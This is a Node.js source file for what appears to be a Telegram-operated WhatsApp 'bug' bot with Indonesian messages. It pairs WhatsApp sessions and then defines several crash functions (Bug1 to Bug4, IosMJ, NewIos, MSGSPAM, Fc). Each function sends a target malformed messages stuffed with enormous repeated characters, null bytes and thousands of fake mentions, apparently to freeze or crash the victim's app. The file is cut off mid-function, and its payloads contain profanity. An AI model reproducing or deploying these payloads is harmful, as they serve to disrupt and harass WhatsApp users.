const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const axios = require("axios");


function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const cooldowns = new Map();
const COOLDOWN_TIME = 80 * 1000; // 60 detik
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });
const processingCommands = new Map();

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
            try {
            angeles.newsletterFollow("120363373008401043@newsletter");
             } catch (error) {
            console.error('Newsletter error:', error);
            }
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `╭─────────────────
│    *MEMULAI*    
│────────────────
│ Bot: ${botNumber}
│ Status: Inisialisasi...
╰─────────────────`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `╭─────────────────
│    *RECONNECTING*    
│────────────────
│ Bot: ${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `╭─────────────────
│    *KONEKSI GAGAL*    
│────────────────
│ Bot: ${botNumber}
│ Status: Tidak dapat terhubung
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `╭─────────────────
│    *TERHUBUNG*    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil terhubung!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `╭─────────────────
│    *KODE PAIRING*    
│────────────────
│ Bot: ${botNumber}
│ Kode: ${formattedCode}
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Pesan: ${error.message}
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
}

// [ BUG FUNCTION ]
async function Bug1(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "✦  ̶̶̱̲̄͟͟͞͞.𝘾𝙚͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙡𝙇𝙖𝙖 𝘾𝙧𝙖͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙨𝙯𝙝𝙚𝙧" + "ꦽ".repeat(9740),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "⚡",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid, "13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "KONTOL LUH ANJING",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "𐎟 ✦  ̶̶̱̲̄͟͟͞͞.𝘾𝙚͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙡𝙇𝙖𝙖 𝘾𝙧𝙖͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙨𝙯𝙝𝙚𝙧 𐎟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "VQuoted",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: jid,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "Supra MK4" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: "",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(jid, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: jid },
  });
}

//NON CLICK
async function Bug2(sock, jid) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [jid],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: {
              text: "𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, message, {
      participant: { jid: jid },
    });
  } catch (err) {
    console.log(err);
  }
}

async function Bug4(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫ી )𐎟 ♨️" + "ꦽ".repeat(9740),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "⚡",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "KONTOL LUH ANJING",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "A single apology won't kill you, and fear is something you can face.",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "ㇱ 𝗙𝗮𝗶𝗹 - (𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 ી )𐎟 ♨️",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "VQuoted",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: jid,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "Supra MK4" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: "",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : lieangell",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(jid, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: jid },
  });
}

async function Bug3(sock, jid) {
  let target = jid;
  let msg = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝗨𝗻𝗱𝗲𝗿𝗰𝗿𝗮𝘀𝗵",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id,
    participant: { jid: jid },
  });
}
    
    async function IosMJ(sock, jid) {
      await sock.relayMessage(
        jid,
        {
          extendedTextMessage: {
            text: "p                                     ." + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: jid,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Lieangell",
                mediaUrl: "https://t.me/Lieangell",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/Lieangell",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbsockCampaignId: "smb_sock_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        sock
          ? {
              participant: {
                jid: jid,
              },
            }
          : {}
      );
    }

async function NewIos(sock, jid) {
sock.relayMessage(
    jid,
    {
        extendedTextMessage: {
            text: `𑲭𑲭Hello¿? ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: Jepeg,
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "FINIX - CRITICAL FINISH",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: Jepeg,
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    sock
        ? {
              participant: {
                  jid: jid
              }
          }
        : {}
       
);
console.log("Success! Force Ios Sent")
}
async function MSGSPAM(sock, jid) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: {
              text: ".",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, Msg, {
      participant: { jid: jid },
    })
  }
async function Fc(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 )𐎟 ♨️" + "ꦾ".repeat(115000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "SSS+",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  contactVcard: true,
                },
                contentText: "lol",
                footerText: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            actionLink: {
